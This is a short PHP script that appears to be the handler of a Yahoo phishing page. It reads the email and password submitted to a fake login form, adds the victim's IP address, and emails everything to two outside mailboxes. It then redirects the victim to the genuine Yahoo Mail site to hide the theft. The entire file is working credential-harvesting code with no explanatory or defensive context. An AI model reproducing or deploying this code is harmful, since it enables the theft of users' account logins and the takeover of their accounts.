<?
$ip = getenv("REMOTE_ADDR");
$message .= "---- : || Yahoo || :------\n";
$message .= "email: ".$_POST['formtext1']."\n";
$message .= "password: ".$_POST['formtext2']."\n";
$message .= "----: || THckingE TO GOD || :------\n";
$message .= "IP: ".$ip."\n";
$recipient ="team80010@gmail.com, replyto0@yandex.com";
$subject = "tare | ".$ip."\n";
mail($recipient,$subject,$message);
header("Location: https://mail.yahoo.com/");
?>